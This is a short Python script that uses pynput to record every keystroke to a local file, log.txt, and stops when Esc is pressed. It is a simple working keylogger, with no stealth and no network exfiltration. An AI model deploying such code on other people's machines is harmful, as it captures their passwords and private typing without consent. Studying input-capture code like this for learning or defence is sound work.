from pynput import keyboard

def on_press(key):
    try:
        with open("log.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("log.txt", "a") as f:
            f.write(f"[{key.name}]")

    # shortcut for ending (esc)
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
